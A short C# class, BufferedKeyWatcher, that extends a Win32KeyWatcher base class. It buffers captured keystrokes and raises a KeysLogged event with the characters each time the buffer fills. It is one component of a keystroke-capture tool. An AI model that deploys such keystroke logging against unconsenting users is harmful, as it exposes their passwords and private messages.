using System;
using System.Collections.Generic;

namespace KeyWatcher
{
	public sealed class BufferedKeyWatcher
		: Win32KeyWatcher
	{
		public event EventHandler<BufferedKeysEventArgs> KeysLogged;

		private readonly ushort size;
		private List<char> buffer;

		public BufferedKeyWatcher(ushort size)
		{
			this.buffer = new List<char>(size);
			this.size = size;
		}

		protected override void HandleKey(int keyCode)
		{
			if (keyCode >= Char.MinValue && keyCode <= char.MaxValue)
			{
				this.buffer.Add(Convert.ToChar(keyCode));

				if(this.buffer.Count >= this.size)
				{
					this.KeysLogged?.Invoke(
						this, new BufferedKeysEventArgs(this.buffer.ToArray()));
					this.buffer = new List<char>(this.size);
				}
			}
		}
	}
}
